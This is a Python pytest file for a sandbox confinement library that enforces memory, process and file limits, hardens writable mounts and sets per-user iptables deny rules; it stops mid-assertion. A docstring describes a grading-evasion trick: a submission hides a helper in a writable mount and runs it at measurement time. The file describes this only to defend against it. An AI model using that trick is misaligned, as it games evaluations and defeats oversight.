import errno
import os
import shutil
import socket
import stat
import subprocess
from collections.abc import Callable
from dataclasses import dataclass, field
from pathlib import Path
from types import SimpleNamespace

import psutil
import pytest
from loguru import logger

from karotte import cgroups, confinement, container, memory_watch
from karotte.cgroups import V2Cgroup, student_cgroup
from karotte.confinement import (
    _FREE_DISK_FRACTION,  # pyright: ignore[reportPrivateUsage]
    DISK_BUDGET_ENV_VAR,
    FIREWALL_TOLERATE_ENV_VAR,
    GIB,
    HARNESS_RESERVE_BYTES,
    SANDBOX_ENV_VAR,
    SANDBOX_MEMORY_ENV_VAR,
    STUDENT_FILE_COUNT_LIMIT,
    STUDENT_NETWORK_ENV_VAR,
    STUDENT_PROCESS_LIMIT,
    CgroupConfinement,
    Confinement,
    Contract,
    FileLimit,
    Sandbox,
    WatchdogConfinement,
    _default_file_limit,  # pyright: ignore[reportPrivateUsage]
    apply_default_file_limit,
    apply_default_limits,
    build_confinement,
    current_sandbox,
    describe_confinement,
    ensure_default_limits,
    get_confinement,
    get_resource_limits,
    limit_resources,
    network_needs_namespace,
    sandbox_memory_bytes,
)
from karotte.file_quota import FileQuota
from karotte.hardware import HardwareLimits
from tests.conftest import register_hardware_plugins


def _always_disk_backed(_path: Path) -> bool:
    return True


@pytest.fixture(autouse=True)
def forget_cached_sandbox():
    current_sandbox.cache_clear()
    yield
    current_sandbox.cache_clear()


@pytest.fixture(autouse=True)
def no_student_uid(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(confinement, "demoted_uid_gid", lambda: None)


@dataclass
class FakeWatch:
    uid: int
    max_bytes: int | None
    max_processes: int | None
    stopped: bool = False

    def stop(self) -> None:
        self.stopped = True


@dataclass
class FakeWatches:
    started: list[FakeWatch] = field(default_factory=list)

    def start(
        self,
        uid: int,
        max_bytes: int | None = None,
        *,
        max_processes: int | None = None,
    ) -> FakeWatch:
        watch = FakeWatch(uid, max_bytes, max_processes)
        self.started.append(watch)
        return watch


@pytest.fixture
def watches(monkeypatch: pytest.MonkeyPatch) -> FakeWatches:
    fake = FakeWatches()
    monkeypatch.setattr(memory_watch, "start_watch", fake.start)
    return fake


@dataclass
class FakeFileWatch:
    uid: int
    paths: tuple[Path, ...]
    max_bytes: int | None
    max_count: int | None
    stopped: bool = False

    def stop(self) -> None:
        self.stopped = True


@dataclass
class FakeFileWatches:
    started: list[FakeFileWatch] = field(default_factory=list)

    def start(
        self,
        uid: int,
        paths: tuple[Path, ...],
        *,
        max_bytes: int | None = None,
        max_count: int | None = None,
    ) -> FakeFileWatch:
        watch = FakeFileWatch(uid, tuple(paths), max_bytes, max_count)
        self.started.append(watch)
        return watch


@pytest.fixture
def file_watches(monkeypatch: pytest.MonkeyPatch) -> FakeFileWatches:
    fake = FakeFileWatches()
    monkeypatch.setattr(memory_watch, "start_file_watch", fake.start)
    return fake


def test_sandbox_comes_from_the_env_var(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv(SANDBOX_ENV_VAR, "firecracker")
    assert current_sandbox() is Sandbox.FIRECRACKER


@pytest.mark.parametrize("value", ["vm", "firecracker"])
def test_firecracker_is_the_older_name_for_vm(
    monkeypatch: pytest.MonkeyPatch, value: str
) -> None:
    monkeypatch.setenv(SANDBOX_ENV_VAR, value)
    assert current_sandbox() is Sandbox.VM
    assert Sandbox.FIRECRACKER is Sandbox.VM


def test_unknown_sandbox_falls_back_to_sniffing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv(SANDBOX_ENV_VAR, "nonsense")
    monkeypatch.setattr(confinement, "is_gvisor", lambda: True)
    assert current_sandbox() is Sandbox.GVISOR


def test_absent_env_var_still_detects_gvisor(monkeypatch: pytest.MonkeyPatch) -> None:
    """A host CLI predating KAROTTE_SANDBOX can launch an image that expects it."""
    monkeypatch.delenv(SANDBOX_ENV_VAR, raising=False)
    monkeypatch.setattr(confinement, "is_gvisor", lambda: True)
    assert current_sandbox() is Sandbox.GVISOR


def test_only_the_sentry_file_detects_gvisor(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    sentry = tmp_path / "sentry-meminfo"
    monkeypatch.setenv("KAROTTE_GVISOR", "1")
    monkeypatch.setattr(container, "GVISOR_SENTRY_PROC", str(sentry))
    assert not container.is_gvisor()
    sentry.touch()
    assert container.is_gvisor()


@pytest.mark.usefixtures("watches")
def test_gvisor_never_uses_cgroups(monkeypatch: pytest.MonkeyPatch) -> None:
    """gVisor accepts every write and enforces none, so a working-looking
    cgroup there must not be reported as a limit."""
    called = False

    def _detect() -> None:
        nonlocal called
        called = True

    monkeypatch.setattr(confinement, "detect_cgroups", _detect)

    result = build_confinement(Sandbox.GVISOR, uid=1234)

    assert not called
    assert isinstance(result, WatchdogConfinement)


def test_without_cgroups_and_without_a_uid_limits_report_unsupported(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(confinement, "detect_cgroups", lambda: None)

    result = build_confinement(Sandbox.RUNC)

    assert result.limit_memory(1) is Contract.UNSUPPORTED
    assert result.limit_processes(1) is Contract.UNSUPPORTED
    assert result.student_preexec() is None


def test_without_cgroups_the_watchdog_reaps(
    monkeypatch: pytest.MonkeyPatch, watches: FakeWatches
) -> None:
    monkeypatch.setattr(confinement, "detect_cgroups", lambda: None)

    result = build_confinement(Sandbox.RUNC, uid=1234)

    assert result.limit_memory(256 << 20) is Contract.REAPED
    assert result.student_preexec() is None
    assert watches.started == [FakeWatch(1234, 256 << 20, None)]


def test_the_uid_comes_from_the_demotion_target(
    monkeypatch: pytest.MonkeyPatch, watches: FakeWatches
) -> None:
    monkeypatch.setattr(confinement, "demoted_uid_gid", lambda: 4321)

    result = build_confinement(Sandbox.GVISOR)

    assert isinstance(result, WatchdogConfinement)
    assert result.limit_processes(64) is Contract.REAPED
    assert watches.started == [FakeWatch(4321, None, 64)]


def test_the_watchdog_merges_both_limits_into_one_watch(
    watches: FakeWatches,
) -> None:
    result = build_confinement(Sandbox.GVISOR, uid=1234)

    assert result.limit_memory(256 << 20) is Contract.REAPED
    assert result.limit_processes(64) is Contract.REAPED

    assert watches.started[0].stopped
    last = watches.started[-1]
    assert (last.max_bytes, last.max_processes) == (256 << 20, 64)
    assert not last.stopped


def test_closing_the_watchdog_stops_the_watch(watches: FakeWatches) -> None:
    result = build_confinement(Sandbox.GVISOR, uid=1234)
    _ = result.limit_memory(256 << 20)

    result.close()

    assert all(watch.stopped for watch in watches.started)


def test_closing_without_a_limit_is_a_no_op(watches: FakeWatches) -> None:
    result = build_confinement(Sandbox.GVISOR, uid=1234)

    result.close()

    assert watches.started == []


def test_with_cgroups_limits_are_prevented(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    root = tmp_path / "cgroup"
    root.mkdir()
    (root / "cgroup.controllers").write_text("memory pids")
    (root / "cgroup.subtree_control").write_text("")
    (root / "cgroup.procs").write_text("")
    monkeypatch.setattr(confinement, "detect_cgroups", lambda: V2Cgroup(root))

    result = build_confinement(Sandbox.FIRECRACKER)

    assert isinstance(result, CgroupConfinement)
    assert result.limit_memory(256) is Contract.PREVENTED
    assert result.limit_processes(64) is Contract.PREVENTED
    assert result.student_preexec() is not None


def test_a_failed_write_is_not_reported_as_a_limit(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The whole point of the contract: only say 'prevented' if it took."""
    root = tmp_path / "cgroup"
    root.mkdir()
    (root / "cgroup.controllers").write_text("memory pids")
    (root / "cgroup.subtree_control").write_text("")
    (root / "cgroup.procs").write_text("")
    monkeypatch.setattr(confinement, "detect_cgroups", lambda: V2Cgroup(root))

    result = build_confinement(Sandbox.FIRECRACKER)
    monkeypatch.setattr(cgroups.StudentCgroup, "_write", staticmethod(lambda *_: False))

    assert result.limit_memory(256) is Contract.UNSUPPORTED


class TestFileLimitsOnACgroupSandbox:
    """The first byte-capped file limit gets the kernel-enforced quota mount;
    later adjustments run the watchdog inside that backstop."""

    @pytest.fixture
    def cgroup_sandbox(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        root = tmp_path / "cgroup"
        root.mkdir()
        (root / "cgroup.controllers").write_text("memory pids")
        (root / "cgroup.subtree_control").write_text("")
        (root / "cgroup.procs").write_text("")
        monkeypatch.setattr(confinement, "detect_cgroups", lambda: V2Cgroup(root))

    @pytest.fixture
    def quotas(self, monkeypatch: pytest.MonkeyPatch) -> list[FileQuota]:
        mounted: list[FileQuota] = []

        def mount(
            paths: tuple[Path, ...], max_bytes: int, _max_count: int | None
        ) -> FileQuota:
            quota = FileQuota(max_bytes, tuple(paths))
            mounted.append(quota)
            return quota

        monkeypatch.setattr(confinement, "mount_file_quota", mount)
        return mounted

    @pytest.mark.usefixtures("cgroup_sandbox")
    def test_the_first_file_limit_gets_the_kernel_mount(
        self, quotas: list[FileQuota], file_watches: FakeFileWatches
    ) -> None:
        result = build_confinement(Sandbox.FIRECRACKER, uid=1234)
        limit = FileLimit(path="/workdir", bytes=5 * GIB, count=100_000)

        contract = result.limit_files(limit)

        assert contract is Contract.PREVENTED
        assert quotas == [FileQuota(5 * GIB, (Path("/workdir"),))]
        assert file_watches.started == []
        assert result.current_limits().file == limit

    @pytest.mark.usefixtures("cgroup_sandbox")
    def test_a_failed_mount_falls_back_to_the_watchdog(
        self, monkeypatch: pytest.MonkeyPatch, file_watches: FakeFileWatches
    ) -> None:
        def refuse(*_args: object) -> None:
            return None

        monkeypatch.setattr(confinement, "mount_file_quota", refuse)
        result = build_confinement(Sandbox.FIRECRACKER, uid=1234)

        contract = result.limit_files(FileLimit(path="/workdir", bytes=5 * GIB))

        assert contract is Contract.REAPED
        assert file_watches.started[-1].max_bytes == 5 * GIB

    @pytest.mark.usefixtures("cgroup_sandbox")
    def test_later_limits_adjust_by_watchdog_inside_the_mount(
        self, quotas: list[FileQuota], file_watches: FakeFileWatches
    ) -> None:
        result = build_confinement(Sandbox.FIRECRACKER, uid=1234)
        _ = result.limit_files(FileLimit(path="/workdir", bytes=5 * GIB))

        contract = result.limit_files(FileLimit(path="/workdir", bytes=1 * GIB))

        assert contract is Contract.REAPED
        assert len(quotas) == 1
        assert file_watches.started[-1].max_bytes == 1 * GIB

    @pytest.mark.usefixtures("cgroup_sandbox")
    def test_a_countless_limit_never_mounts(
        self, quotas: list[FileQuota], file_watches: FakeFileWatches
    ) -> None:
        """Without a byte budget there is no filesystem size to enforce with."""
        result = build_confinement(Sandbox.FIRECRACKER, uid=1234)

        contract = result.limit_files(FileLimit(path="/workdir", count=100))

        assert contract is Contract.REAPED
        assert quotas == []
        assert file_watches.started[-1].max_count == 100


class TestKillPathRegistration:
    def test_the_built_group_is_registered_for_the_kill_path(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """``kill_processes`` reaps the group through
        :func:`karotte.cgroups.student_cgroup`, so building the confinement must
        put the group there, keyed by its uid."""
        root = tmp_path / "cgroup"
        root.mkdir()
        (root / "cgroup.controllers").write_text("memory pids")
        (root / "cgroup.subtree_control").write_text("")
        (root / "cgroup.procs").write_text("")
        monkeypatch.setattr(confinement, "detect_cgroups", lambda: V2Cgroup(root))
        monkeypatch.setenv(SANDBOX_ENV_VAR, "firecracker")

        built = get_confinement(1234)

        assert isinstance(built, CgroupConfinement)
        assert student_cgroup(1234) is built.group

    def test_a_watchdog_registers_no_group(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(confinement, "detect_cgroups", lambda: None)

        built = get_confinement(1234)

        assert isinstance(built, WatchdogConfinement)
        assert student_cgroup(1234) is None


def _small_hardware(hardware: str) -> HardwareLimits | None:
    return HardwareLimits(memory_bytes=5 * GIB) if hardware == "small" else None


class TestLimitResources:
    @pytest.fixture(autouse=True)
    def in_a_container(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("KAROTTE_CONTAINERIZED", "1")
        monkeypatch.setattr(confinement, "demoted_uid_gid", lambda: 1000)
        monkeypatch.setattr(confinement, "detect_cgroups", lambda: None)
        register_hardware_plugins(monkeypatch, limits={"a": _small_hardware})

    @pytest.fixture
    def default_disk(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
        """A student-writable world of one workdir with 10 GiB free."""
        monkeypatch.setenv("KAROTTE_WORKDIR", str(tmp_path))
        monkeypatch.setattr(memory_watch, "TEMP_DIRS", ())
        monkeypatch.setattr(memory_watch, "disk_backed", lambda _path: True)  # pyright: ignore[reportUnknownLambdaType]
        monkeypatch.setattr(
            shutil,
            "disk_usage",
            lambda _path: SimpleNamespace(free=10 * GIB),  # pyright: ignore[reportUnknownLambdaType]
        )
        return tmp_path

    @pytest.mark.usefixtures("file_watches", "default_disk")
    def test_the_plugin_defaults_land_on_the_student(
        self, watches: FakeWatches
    ) -> None:
        contracts = apply_default_limits("small")

        assert set(contracts) == {"memory", "processes", "files"}
        last = watches.started[-1]
        assert last.uid == 1000
        assert last.max_bytes == 5 * GIB - HARNESS_RESERVE_BYTES
        assert last.max_processes == STUDENT_PROCESS_LIMIT

    @pytest.mark.usefixtures("file_watches", "default_disk")
    def test_unknown_hardware_caps_processes_but_not_memory(
        self, watches: FakeWatches
    ) -> None:
        contracts = apply_default_limits("made-up")

        assert set(contracts) == {"processes", "files"}
        last = watches.started[-1]
        assert (last.max_bytes, last.max_processes) == (None, STUDENT_PROCESS_LIMIT)

    @pytest.mark.usefixtures("default_disk")
    def test_the_default_file_limit_alone_starts_no_watch(
        self, watches: FakeWatches, file_watches: FakeFileWatches
    ) -> None:
        contracts = apply_default_file_limit("small")

        assert set(contracts) == {"files"}
        assert watches.started == []
        assert file_watches.started[-1].max_bytes == int(10 * GIB * 0.8)

    def test_ensuring_defaults_lands_both_when_none_is_in_force(
        self, watches: FakeWatches
    ) -> None:
        contracts = ensure_default_limits("small")

        assert set(contracts) == {"memory", "processes"}
        last = watches.started[-1]
        assert last.max_bytes == 5 * GIB - HARNESS_RESERVE_BYTES
        assert last.max_processes == STUDENT_PROCESS_LIMIT

    def test_ensuring_defaults_keeps_limits_in_force(
        self, watches: FakeWatches
    ) -> None:
        _ = limit_resources(memory_bytes=1 * GIB, process_count=64)

        contracts = ensure_default_limits("small")

        assert contracts == {}
        last = watches.started[-1]
        assert (last.max_bytes, last.max_processes) == (1 * GIB, 64)

    def test_ensuring_defaults_fills_only_the_missing_limit(
        self, watches: FakeWatches
    ) -> None:
        _ = limit_resources(memory_bytes=1 * GIB)

        contracts = ensure_default_limits("small")

        assert set(contracts) == {"processes"}
        last = watches.started[-1]
        assert (last.max_bytes, last.max_processes) == (
            1 * GIB,
            STUDENT_PROCESS_LIMIT,
        )

    def test_ensuring_defaults_on_unknown_hardware_caps_only_processes(
        self, watches: FakeWatches
    ) -> None:
        contracts = ensure_default_limits("made-up")

        assert set(contracts) == {"processes"}
        last = watches.started[-1]
        assert (last.max_bytes, last.max_processes) == (None, STUDENT_PROCESS_LIMIT)

    @pytest.mark.usefixtures("watches")
    def test_the_default_file_limit_is_most_of_the_free_disk(
        self, file_watches: FakeFileWatches, default_disk: Path
    ) -> None:
        _ = apply_default_limits("small")

        last = file_watches.started[-1]
        assert last.uid == 1000
        assert last.paths == (default_disk,)
        assert last.max_bytes == int(10 * GIB * 0.8)
        assert last.max_count == STUDENT_FILE_COUNT_LIMIT

    @pytest.mark.usefixtures("watches", "default_disk")
    def test_ram_backed_directories_are_not_in_the_default_file_limit(
        self, file_watches: FakeFileWatches, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(memory_watch, "disk_backed", lambda _path: False)  # pyright: ignore[reportUnknownLambdaType]

        contracts = apply_default_limits("small")

        assert "files" not in contracts
        assert file_watches.started == []

    def test_outside_a_container_nothing_is_limited(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("KAROTTE_CONTAINERIZED", raising=False)

        assert limit_resources(uid=1000, memory_bytes=1 * GIB) == {}

    def test_both_limits_land_in_one_watch(self, watches: FakeWatches) -> None:
        contracts = limit_resources(uid=1000, memory_bytes=5 * GIB, process_count=64)

        assert contracts == {
            "memory": "detected_and_reaped",
            "processes": "detected_and_reaped",
        }
        last = watches.started[-1]
        assert (last.max_bytes, last.max_processes) == (5 * GIB, 64)

    def test_what_is_not_passed_is_kept(self, watches: FakeWatches) -> None:
        _ = limit_resources(uid=1000, memory_bytes=5 * GIB)
        _ = limit_resources(uid=1000, process_count=64)

        last = watches.started[-1]
        assert (last.max_bytes, last.max_processes) == (5 * GIB, 64)

    def test_an_explicit_none_lifts_the_limit(self, watches: FakeWatches) -> None:
        _ = limit_resources(uid=1000, memory_bytes=5 * GIB, process_count=64)

        contracts = limit_resources(uid=1000, memory_bytes=None)

        assert contracts == {}
        last = watches.started[-1]
        assert (last.max_bytes, last.max_processes) == (None, 64)

    def test_lifting_every_limit_stops_the_watch(self, watches: FakeWatches) -> None:
        _ = limit_resources(uid=1000, memory_bytes=5 * GIB)

        _ = limit_resources(uid=1000, memory_bytes=None)

        assert all(watch.stopped for watch in watches.started)
        assert len(watches.started) == 1

    def test_a_lift_reports_no_contract(self, watches: FakeWatches) -> None:
        contracts = limit_resources(uid=1000, memory_bytes=5 * GIB, process_count=None)

        assert contracts == {"memory": "detected_and_reaped"}
        assert watches.started[-1].max_processes is None

    @pytest.mark.usefixtures("watches")
    def test_a_file_limit_starts_a_file_watch(
        self, file_watches: FakeFileWatches
    ) -> None:
        limit = FileLimit(path="/workdir", bytes=5 * GIB, count=100_000)

        contracts = limit_resources(uid=1000, file=limit)

        assert contracts == {"files": "detected_and_reaped"}
        last = file_watches.started[-1]
        assert last.uid == 1000
        assert last.paths == (Path("/workdir"),)
        assert (last.max_bytes, last.max_count) == (5 * GIB, 100_000)

    @pytest.mark.usefixtures("watches")
    def test_a_new_file_limit_replaces_the_watch(
        self, file_watches: FakeFileWatches
    ) -> None:
        _ = limit_resources(uid=1000, file=FileLimit(path="/workdir", bytes=5 * GIB))

        _ = limit_resources(uid=1000, file=FileLimit(path="/workdir", bytes=1 * GIB))

        assert file_watches.started[0].stopped
        assert not file_watches.started[-1].stopped
        assert file_watches.started[-1].max_bytes == 1 * GIB

    @pytest.mark.usefixtures("watches")
    def test_lifting_the_file_limit_stops_the_watch(
        self, file_watches: FakeFileWatches
    ) -> None:
        _ = limit_resources(uid=1000, file=FileLimit(path="/workdir", bytes=5 * GIB))

        contracts = limit_resources(uid=1000, file=None)

        assert contracts == {}
        assert all(watch.stopped for watch in file_watches.started)

    @pytest.mark.usefixtures("watches", "file_watches")
    def test_the_file_limit_reads_back(self) -> None:
        limit = FileLimit(path="/workdir", bytes=5 * GIB, count=100_000)
        _ = limit_resources(uid=1000, file=limit)

        assert get_resource_limits(uid=1000).file == limit

    def test_each_uid_gets_its_own_confinement(self, watches: FakeWatches) -> None:
        _ = limit_resources(uid=1000, memory_bytes=5 * GIB)
        _ = limit_resources(uid=2000, memory_bytes=1 * GIB)

        assert {(w.uid, w.max_bytes) for w in watches.started} == {
            (1000, 5 * GIB),
            (2000, 1 * GIB),
        }

    def test_the_default_uid_is_the_demotion_target(self, watches: FakeWatches) -> None:
        _ = limit_resources(memory_bytes=5 * GIB)

        assert watches.started[-1].uid == 1000

    @pytest.mark.usefixtures("watches")
    def test_the_limits_read_back(self) -> None:
        _ = limit_resources(uid=1000, memory_bytes=5 * GIB, process_count=64)
        _ = limit_resources(uid=1000, process_count=None)

        limits = get_resource_limits(uid=1000)

        assert (limits.memory_bytes, limits.process_count) == (5 * GIB, None)

    def test_outside_a_container_there_are_no_limits_to_read(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("KAROTTE_CONTAINERIZED", raising=False)

        limits = get_resource_limits(uid=1000)

        assert (limits.memory_bytes, limits.process_count) == (None, None)


Mount = Callable[..., Path]


class TestHardenFilesystem:
    """A mount point handed over group- or world-writable is a stash channel:
    it sits outside every directory grading sweeps, so a submission can hide a
    helper there before grading and exec it at measurement time. Which mounts
    those are is read off their mode, not predicted from the runtime's name."""

    @pytest.fixture
    def mount(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Mount:
        """Builds a fake /proc/mounts out of real directories under tmp_path,
        with the student's promised world pointed at ``workdir`` and ``shm``."""
        table = tmp_path / "proc_mounts"
        table.write_text("")
        monkeypatch.setattr(container, "MOUNTS", table)
        monkeypatch.setenv("KAROTTE_CONTAINERIZED", "1")
        monkeypatch.setenv("KAROTTE_WORKDIR", str(tmp_path / "workdir"))
        monkeypatch.setattr(memory_watch, "TEMP_DIRS", (tmp_path / "shm",))

        def add(name: str, mode: int | None = 0o1777) -> Path:
            point = tmp_path / name
            if mode is not None:
                point.mkdir(parents=True, exist_ok=True)
                point.chmod(mode)
            field = str(point).replace(" ", "\\040")
            with table.open("a") as lines:
                _ = lines.write(f"tmpfs {field} tmpfs rw,relatime 0 0\n")
            return point

        return add

    def harden(self) -> list[Path]:
        return Confinement(Sandbox.FIRECRACKER).harden_filesystem()

    def test_a_writable_mount_is_closed(self, mount: Mount) -> None:
        cgroup = mount("sys/fs/cgroup")

        assert self.harden() == [cgroup]
        assert stat.S_IMODE(cgroup.stat().st_mode) == 0o1755

    def test_a_mount_exempted_by_the_env_var_keeps_its_write_bits(
        self, mount: Mount, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """An external harness's log mounts are handed to the student on purpose."""
        logs = mount("logs")
        agent_logs = mount("logs/agent")
        cgroup = mount("sys/fs/cgroup")
        monkeypatch.setenv(confinement.HARDEN_EXEMPT_ENV_VAR, str(logs))

        assert self.harden() == [cgroup]
        assert stat.S_IMODE(logs.stat().st_mode) == 0o1777
        assert stat.S_IMODE(agent_logs.stat().st_mode) == 0o1777

    def test_the_env_var_takes_several_exemptions(
        self, mount: Mount, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        one = mount("one")
        two = mount("two")
        cgroup = mount("sys/fs/cgroup")
        monkeypatch.setenv(
            confinement.HARDEN_EXEMPT_ENV_VAR, os.pathsep.join((str(one), str(two)))
        )

        assert self.harden() == [cgroup]

    def test_a_promised_mount_keeps_its_write_bits(self, mount: Mount) -> None:
        """/dev/shm is world-writable on purpose."""
        shm = mount("shm")
        cgroup = mount("sys/fs/cgroup")

        assert self.harden() == [cgroup]
        assert stat.S_IMODE(shm.stat().st_mode) == 0o1777

    def test_the_workdir_is_promised_by_the_environment_alone(
        self, mount: Mount
    ) -> None:
        """No path is exempt by convention: an image that puts the workdir
        somewhere else says so through KAROTTE_WORKDIR."""
        _ = mount("workdir")

        assert confinement._promised_writable() == (  # pyright: ignore[reportPrivateUsage]
            Path(os.environ["KAROTTE_WORKDIR"]),
            *memory_watch.TEMP_DIRS,
        )

    def test_a_mount_under_a_promised_directory_is_left_alone(
        self, mount: Mount
    ) -> None:
        nested = mount("workdir/scratch")

        assert self.harden() == []
        assert stat.S_IMODE(nested.stat().st_mode) == 0o1777

    def test_traversal_survives_so_the_cgroup_hierarchy_stays_reachable(
        self, mount: Mount
    ) -> None:
        """In cgroup v1 the root of /sys/fs/cgroup is a tmpfs with each
        controller a separate mount under it: closing the root must not take
        the execute bits that reach them."""
        root = mount("sys/fs/cgroup")
        controller = mount("sys/fs/cgroup/memory", 0o0755)
        group = controller / "karotte_uid_1000"
        group.mkdir()

        assert self.harden() == [root]
        mode = stat.S_IMODE(root.stat().st_mode)
        assert mode & (stat.S_IXGRP | stat.S_IXOTH) == stat.S_IXGRP | stat.S_IXOTH
        assert stat.S_IMODE(controller.stat().st_mode) == 0o0755
        assert group.is_dir()

    def test_a_mount_that_is_not_a_directory_is_left_alone(self, mount: Mount) -> None:
        """A runtime bind-mounts /dev/null and friends in at 0666, and nothing
        can be hidden inside a character device. Taking write off them breaks
        every process that redirects there."""
        devnull = mount("dev/null", None)
        devnull.parent.mkdir(parents=True, exist_ok=True)
        devnull.touch()
        devnull.chmod(0o0666)

        assert self.harden() == []
        assert stat.S_IMODE(devnull.stat().st_mode) == 0o0666

    def test_a_mount_only_its_owner_can_write_is_not_reported(
        self, mount: Mount
    ) -> None:
        already = mount("sys/fs/cgroup", 0o0755)

        assert self.harden() == []
        assert stat.S_IMODE(already.stat().st_mode) == 0o0755

    def test_group_write_comes_off_with_the_world_bit(self, mount: Mount) -> None:
        point = mount("dev/mqueue", 0o0776)

        assert self.harden() == [point]
        assert stat.S_IMODE(point.stat().st_mode) == 0o0754

    def test_a_mount_point_that_is_not_there_is_stepped_over(
        self, mount: Mount
    ) -> None:
        _ = mount("absent", None)
        cgroup = mount("sys/fs/cgroup")

        assert self.harden() == [cgroup]

    def test_a_mount_point_whose_name_carries_a_space(self, mount: Mount) -> None:
        """/proc/mounts octal-escapes the characters that would split a field."""
        point = mount("odd name")

        assert self.harden() == [point]

    def test_a_chmod_that_fails_is_not_reported_as_closed(
        self, mount: Mount, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Hardening what it can is worth more than failing the run."""
        _ = mount("sys/fs/cgroup")

        def refuse(*_args: object, **_kwargs: object) -> None:
            raise OSError("read-only filesystem")

        monkeypatch.setattr("karotte.confinement.os.chmod", refuse)

        assert self.harden() == []

    @pytest.mark.parametrize(
        ("err", "warned"), [(errno.EROFS, False), (errno.EPERM, True)]
    )
    def test_only_a_chmod_refused_on_a_writable_mount_warns(
        self, mount: Mount, monkeypatch: pytest.MonkeyPatch, err: int, warned: bool
    ) -> None:
        """Nobody can write to a read-only mount, whatever its mode says."""
        _ = mount("proc/acpi")

        def refuse(*_args: object, **_kwargs: object) -> None:
            raise OSError(err, os.strerror(err))

        monkeypatch.setattr("karotte.confinement.os.chmod", refuse)
        warnings: list[str] = []
        handler = logger.add(lambda m: warnings.append(str(m)), level="WARNING")
        try:
            assert self.harden() == []
        finally:
            logger.remove(handler)

        assert bool(warnings) is warned

    def test_an_unreadable_mount_table_closes_nothing(
        self, mount: Mount, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        cgroup = mount("sys/fs/cgroup")
        monkeypatch.setattr(container, "MOUNTS", cgroup / "missing")

        assert self.harden() == []

    def test_outside_a_container_it_touches_nothing(
        self, mount: Mount, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """On a dev box these mounts are the machine's own."""
        cgroup = mount("sys/fs/cgroup")
        monkeypatch.delenv("KAROTTE_CONTAINERIZED")

        assert self.harden() == []
        assert stat.S_IMODE(cgroup.stat().st_mode) == 0o1777


P, R, U = Contract.PREVENTED, Contract.REAPED, Contract.UNSUPPORTED


@pytest.mark.parametrize(
    ("contracts", "firewall", "ipc", "sandbox", "line", "degraded"),
    [
        (
            {"memory": P, "processes": P, "files": P},
            True,
            True,
            Sandbox.RUNC,
            "Confinement: cgroup limits on, file quota on, network firewall on, IPC namespace on, gVisor off",
            False,
        ),
        (
            {"memory": R, "processes": R, "files": R},
            True,
            False,
            Sandbox.RUNC,
            "Confinement: cgroup limits off (watchdog), file quota off (watchdog), network firewall on, IPC namespace off, gVisor off",
            True,
        ),
        (
            {"memory": P, "processes": U},
            False,
            True,
            Sandbox.GVISOR,
            "Confinement: memory limit on, process limit off (none), file quota off (no disk-backed paths), network firewall off, IPC namespace on, gVisor on",
            True,
        ),
        (
            {"processes": P, "files": P},
            None,
            True,
            Sandbox.VM,
            "Confinement: memory limit off (none), process limit on, file quota on, IPC namespace on, VM",
            True,
        ),
    ],
)
def test_describe_confinement(
    contracts: dict[str, Contract],
    firewall: bool | None,
    ipc: bool,
    sandbox: Sandbox,
    line: str,
    degraded: bool,
) -> None:
    assert describe_confinement(
        contracts, network_firewall=firewall, ipc_namespace=ipc, sandbox=sandbox
    ) == (line, degraded)


def test_gvisor_needs_the_network_namespace(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv(SANDBOX_ENV_VAR, "gvisor")
    assert network_needs_namespace()


def test_a_real_kernel_can_trust_its_firewall(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv(SANDBOX_ENV_VAR, "firecracker")
    assert not network_needs_namespace()


@dataclass
class FakeIptables:
    """Records the rules a firewall call would have run."""

    rules: list[str] = field(default_factory=list)
    fails: str | None = None

    def run(self, rule: str, **_: object) -> SimpleNamespace:
        self.rules.append(rule)
        failed = self.fails is not None and self.fails in rule
        return SimpleNamespace(
            returncode=1 if failed else 0, stdout="", stderr="no chain"
        )


@pytest.fixture
def iptables(monkeypatch: pytest.MonkeyPatch) -> FakeIptables:
    fake = FakeIptables()
    monkeypatch.setenv("KAROTTE_CONTAINERIZED", "1")
    monkeypatch.setattr(subprocess, "run", fake.run)
    monkeypatch.setattr(
        confinement, "_own_addresses", lambda: (["10.1.2.3"], ["2001:db8::5"])
    )
    return fake


class TestDenyAllNetwork:
    """A uid that is not the student gets no allowlist at all: the build user
    has no reason to reach localhost, the metadata server or RFC1918."""

    def test_both_families_are_cut_off(self, iptables: FakeIptables) -> None:
        assert Confinement(Sandbox.FIRECRACKER).deny_all_network(900)

        assert iptables.rules == [
            "iptables -A OUTPUT -m owner --uid-owner 900 -j REJECT",
            "ip6tables -A OUTPUT -m owner --uid-owner 900 -j REJECT",
        ]

    def test_nothing_is_allowed_through(self, iptables: FakeIptables) -> None:
        _ = Confinement(Sandbox.FIRECRACKER).deny_all_network(900)

        assert not any("ACCEPT" in rule for rule in iptables.rules)

    def test_a_name_works_as_well_as_a_number(self, iptables: FakeIptables) -> None:
        _ = Confinement(Sandbox.FIRECRACKER).deny_all_network("builder")

        assert all("--uid-owner builder" in rule for rule in iptables.rules)

    def test_gvisor_gets_the_legacy_tables_and_a_silent_drop(
        self, iptables: FakeIptables
    ) -> None:
        _ = Confinement(Sandbox.GVISOR).deny_all_network(900)

        assert iptables.rules == [
